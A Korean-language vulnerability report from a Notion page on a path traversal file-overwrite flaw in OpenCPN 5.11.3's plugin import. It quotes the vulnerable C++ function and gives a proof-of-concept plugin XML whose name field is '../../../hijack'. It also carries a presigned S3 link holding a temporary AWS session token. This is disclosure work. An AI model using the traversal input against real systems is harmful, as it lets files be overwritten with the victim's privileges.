---
notion_url: https://www.notion.so/c3bbe0809830830a942b01d9cc6acbc6
last_synced: 2026-06-12 18:07
tags: [notion-sync]
---

# [KOR] OpenCPN File overwrite - Path traversal report

취약점 제목 : OpenCPN File overwrite - Path traversal report
취약점 요약 : 파일 경로 검증 없이 .meta 파일을 생성함으로 발생하는 File Overwrite
제조사 : Github OpenSource Project
소프트웨어명 : OpenCPN
버전 : 5.11.3
소프트웨어 유형 : ECS (Electronic Chart System)
공격 유형 : Path Traversal
영향 : 프로세스 권한의 File Overwrite
취약한 파일명 : Console.cpp
취약한 함수명 : import_plugin()
취약한 파라미터 : metadata_path = PluginHandler::ImportedMetadataPath([metadata.name](http://metadata.name/));
취약점 발생 환경 : Ubuntu 24.04

Proof Of Concept  : 
Opencpn/cli 내의 console.cpp를 분석 중, import_plugin()에서

```c++
void import_plugin(const std::string& tarball_path) {
    auto handler = PluginHandler::GetInstance();
    PluginMetadata metadata;
    bool ok = handler->ExtractMetadata(tarball_path, metadata);
    if (!ok) {
      std::cerr << "Cannot extract metadata (malformed tarball?)\n";
      exit(2);
    }
    if (!PluginHandler::IsCompatible(metadata)) {
      std::cerr << "Incompatible plugin detected\n";
      exit(2);
    }
    ok = handler->InstallPlugin(metadata, tarball_path);
    if (!ok) {
      std::cerr << "Error extracting import plugin tarball.\n";
      exit(2);
    }
    metadata.is_imported = true;
    auto metadata_path = PluginHandler::ImportedMetadataPath(metadata.name);
    std::ofstream file(metadata_path);
    file << metadata.to_string();
    if (!file.good()) {
      std::cerr << "Error saving metadata file: " << metadata_path
                << " for imported plugin: " << metadata.name;
      exit(2);
    }
    exit(0);
  }
```

`metadata` 경로 검증 과정이 없는것을 확인 후 테스트해보기 위한 xml 파일을 작성

```xml
    <?xml version="1.0" encoding="UTF-8"?>
    <plugin version="1">
      <name>../../../hijack</name>
      <version>0.0.1</version>
      <release>0</release>
      <summary>PoC</summary>
      <description>Path Traversal PoC</description>
      <target>ubuntu-x86_64</target>
      <build-target>ubuntu</build-target>
      <build-gtk>gtk3</build-gtk>
      <target-version>24.04</target-version>
      <target-arch>x86_64</target-arch>
      <api-version>1.18</api-version>
      <tarball-url>file:///nope</tarball-url>
    </plugin>
```

 `<name>` 에 ..나 /를 넣어 Path traversal 시도

![image](_assets/image.png)


취약점 기타 (파일 첨부 영상, 보고서 첨부) :

> 📎 첨부(미변환): [POC.mp4](https://prod-files-secure.s3.us-west-2.amazonaws.com/94a0bc18-384c-4982-9eeb-174bbdc0da9a/b5ba704b-1446-488f-8f07-e5a8cd12e7aa/POC.mp4?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Content-Sha256=UNSIGNED-PAYLOAD&X-Amz-Credential=ASIAZI2LB466XS23C3TK%2F20260612%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20260612T090702Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEEgaCXVzLXdlc3QtMiJHMEUCIQDl9CtujDX9qO7eufUre8qA2QFFRbk44M1it1CqleM2zwIgGkdU78KuC6wgeUP4C12LFyVyajS%2FNfe1DMQczUv5NvUq%2FwMIERAAGgw2Mzc0MjMxODM4MDUiDLJ2GaZpy9QNx57qpircA63pxzxEBNFeMBqPzOIkRMdY2q%2B%2B%2BSlc8hTQjnWnUXvytedgGm%2BkPXrYkmEAoeuIJKadLHijmLuRE9PZnELQzO2daS8a47wcvb%2B2POQ4k1FAldP5ApmLaZU5v6iS9dx%2Bpt2ojj0%2BCQaBo%2BizyRvk1rx9B%2FRni41r9VAkGUALo4VH1F0sQ2rRn14ek3CmioMC1zOT1TVm5ESKiOmR7oI%2FjsfYbGOF951bDBuFpawfqa1FkRaPvqsamHek%2BlpixaT%2FgajwRCjhna%2BIAiwpLEyaSluGrUNcwLu8ddVJmS9%2BvTfKVk0xIkU0HZbuK%2BNwMjgBAvZGSpMRLFeoUWdY3HxMMuZJAxBWW8zaN7bIwaTjcPvmlhgodyA0PEIESgFg4SMF05zVyEElKi8O38v2EpKS0WMjJimEkCWRsoaaemYryP360u5GSNZaBprNZ%2F7C9zH74qTLUWjhfrfHQR8tm3a4fcC9yw96zfGm%2Bp0B3pp30Z9saugiWf4N1TP9y6sq2uQDJEI%2FoULFfHg%2FNVrBHkIP2ScfSYWtmQ7k5SeYrhy99p820SsXojFHPBNW%2BkgQEzDsh9cuWmQS2yFBrNjN0IGvtvyGk9SQdVcMAawbe9mABOVL8fm92ynUuR42Vf%2BjML7zrtEGOqUBjAuVhVA5eBZCKDXDxnB623L4nQqGOkyTOH9CHZJQjdin1klY0oErbjBUDRvJVofXWkFFtNN4hi2N2YFH%2BiHGa5pBpyjUuDwSJ1POtJ4iOxzQo2UQ1kLWIbwO78olt5z%2B43MZ8LfhetL5xh2uqECP2POuADTNOSV%2BGf%2BEFtn8j7fMyLX8iMQWYoNJVD58wDYvKWy7GiGLyRVsFzOj%2BixxOn8gw2Bs&X-Amz-Signature=801069fc21227940d5f30f0de82cc61e6f90fdea8b21051aed62ae4a3eb66cea&X-Amz-SignedHeaders=host&x-amz-checksum-mode=ENABLED&x-id=GetObject)
